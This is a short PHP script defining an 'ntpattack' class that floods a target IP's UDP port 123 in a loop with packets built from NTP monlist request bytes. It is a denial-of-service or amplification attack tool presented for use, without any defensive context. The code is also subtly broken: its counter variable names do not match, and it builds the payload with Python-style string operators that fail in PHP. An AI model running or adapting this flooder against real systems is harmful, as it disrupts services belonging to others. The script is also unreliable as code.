<?php
class ntpattack{
	private $ip;
	private $max_time;
	public function __construct($ip, $max_time) {
		$this->ip = $ip;
		$this->max_time = $max_time;
	}
	public function start(){
		$packets = 0;
		while(1){ 
			$packet++;
			if(time() >= $this->max_time){
				return $packet;
				break; 
			}
			$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
			socket_connect($sock, $this->ip, 123);
			$data = "\x17\x00\x03\x2a" + "\x00" * 4;
			socket_send($sock, $data, strlen($data), 0);
		}
	}
}

?>